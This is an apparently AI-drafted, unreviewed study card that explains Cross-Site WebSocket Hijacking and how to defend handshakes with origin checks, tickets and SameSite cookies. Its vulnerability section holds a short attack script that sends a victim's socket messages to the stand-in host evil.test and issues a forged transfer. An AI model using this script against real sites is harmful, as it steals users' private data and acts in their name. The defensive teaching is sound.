What is Cross-Site WebSocket Hijacking (CSWSH) and how do you protect WebSocket handshakes with origin checks?

Security engineer · Gear 2 (Mid-level) · AppSec · Difficulty: medium · AI-drafted, not yet reviewed by a person

In 30 seconds

Cross-Site WebSocket Hijacking happens when a WebSocket handshake relies only on cookies, so a malicious page makes the victim's browser open an authenticated socket to the target and reads or sends messages. WebSockets are not bound by the same-origin policy, so the server must validate the Origin header, use unguessable tokens or tickets, and avoid ambient cookie authentication alone.

Explained in depth

The vulnerability

A WebSocket starts as an HTTP GET with Upgrade: websocket. Browsers attach cookies to this request for the target domain, and the same-origin policy does not block cross-origin WebSocket connections. The browser sends an Origin header, but nothing forces the server to check it. If the handshake is authenticated only by cookies and no CSRF-style token exists, any web page can do this:

<script>
  const ws = new WebSocket('wss://app.example.com/chat');   // victim's session cookie is sent automatically
  ws.onmessage = e => fetch('https://evil.test/log', {method: 'POST', body: e.data});  // exfiltrate private data
  ws.onopen = () => ws.send(JSON.stringify({action: 'transfer', to: 'attacker', amount: 1000}));
</script>

This is CSWSH, essentially CSRF on the handshake, but worse: the attacker gets a two-way channel and can read responses, so it steals data as well as performing actions.

Impact

Reading private messages, notifications, live account data, tokens delivered over the socket; sending commands as the user (chat, trading, admin consoles, IoT control, Jupyter and dev tools, GraphQL subscriptions); pivoting into internal services when the victim's browser can reach them (localhost dev servers, intranet apps, DNS rebinding).

Defences

  1. Validate the Origin header on the handshake against an explicit allow-list (https://app.example.com). Reject missing or unexpected origins with 403. Compare the exact scheme, host and port, not substring or regex shortcuts (example.com.evil.test must fail).
const wss = new WebSocketServer({ noServer: true });
server.on('upgrade', (req, socket, head) => {
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.has(origin)) { socket.write('HTTP/1.1 403 Forbidden\r\n\r\n'); return socket.destroy(); }
  authenticate(req).then(user => wss.handleUpgrade(req, socket, head, ws => wss.emit('connection', ws, user)))
                   .catch(() => { socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n'); socket.destroy(); });
});

Non-browser clients can forge Origin, so this protects browser victims only. It is not authentication.

  1. Do not rely on ambient cookies alone: require an unguessable token that a cross-origin page cannot know. Typical pattern: the authenticated app calls POST /ws-ticket (protected by normal CSRF controls) and receives a short-lived, single-use ticket bound to the user and origin; the client connects to wss://host/ws?ticket=... or sends it as the first message, and the server consumes and invalidates it. Prefer not to put long-lived credentials in URLs (they appear in logs); tickets expire in seconds, so that risk is small. Alternative: send a CSRF token or access token in the first message and close the socket if authentication fails within a short timeout. Browsers cannot set custom headers on new WebSocket, so cookies, query parameters, Sec-WebSocket-Protocol subprotocol tricks, or first-message auth are the options.
  2. SameSite cookies: SameSite=Lax or Strict on the session cookie stops the browser sending it on cross-site WebSocket handshakes in modern browsers (cross-site WebSocket requests are not top-level navigations, so Lax blocks them). Keep it as defence in depth, since same-site but cross-origin attackers (a vulnerable subdomain) can still reach you; Origin checks cover that.
  3. Authorise every message, not only the handshake: check permissions for each action and channel subscription, validate and size-limit payloads, rate-limit, and never trust client-supplied user IDs.
  4. Always use wss:// (TLS), HSTS, and disallow plain ws:// in production; set strict CORS and CSP connect-src to limit where your own pages connect.
  5. Session lifecycle: close sockets on logout, session expiry, password or permission change; re-authenticate periodically; cap connections per user.
  6. Frameworks: Socket.IO cors.origin options and allowRequest, Spring setAllowedOrigins (never *), Django Channels AllowedHostsOriginValidator, ASP.NET SignalR CORS and antiforgery, ActionCable allowed_request_origins.

Testing

Use Burp Suite to replay the handshake from a page on another origin or with a modified Origin header; verify the server rejects it. Check that the handshake fails without a valid ticket. Review localhost and internal services for the same flaw.

Pitfalls

Assuming same-origin policy covers WebSockets, checking Origin with contains, accepting a missing Origin header for browsers, long-lived tokens in URLs, and Access-Control-Allow-Origin: * on related HTTP endpoints.
